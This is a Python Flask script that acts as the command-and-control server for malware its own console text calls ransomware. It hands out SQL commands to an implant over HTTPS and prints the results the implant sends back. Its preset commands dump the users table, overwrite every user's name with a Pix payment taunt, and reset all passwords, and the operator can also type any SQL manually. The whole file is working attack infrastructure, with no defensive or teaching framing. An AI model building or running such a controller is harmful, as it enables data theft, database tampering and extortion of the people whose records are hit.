from flask import Flask, request, jsonify
import threading
import ssl

app = Flask(__name__)

current_command = ">>>"

def start_server():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain("cert.pem", "key.pem")
    app.run(host="0.0.0.0", port=8443, ssl_context=context)

@app.route("/api/v1/command", methods=["GET"])
def get_command():
    return jsonify({"command": current_command})

@app.route("/api/v1/result", methods=["POST"])
def receive_result():
    data = request.get_json()
    print("Resultado recebido do ransomware:")
    print(data.get("output", "sem saída"))
    return jsonify({"status": "Recebido"})

if __name__ == "__main__":
    print("Servidor de controle iniciado em https://localhost:8443")

    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()

    pre_defined = {
        "1": "SHOW TABLES",
        "2": "SELECT * FROM users",
        "3": "UPDATE users SET name = 'Passa o pix comedia'",
        "4": "UPDATE users SET password = '01788089111'",
    }

    while True:
        print("\nComandos disponíveis:")
        for k, v in pre_defined.items():
            print(f"{k} - {v}")
        print("ou digite um SQL manualmente")
        print("Digite 'stop' para encerrar\n")

        options = input(">>> ")

        if options.lower() == "stop":
            print("Encerrando servidor...")
            break
        elif options in pre_defined:
            current_command = pre_defined[options]
        else:
            current_command = options

        print(f"Comando atualizado: {current_command}")
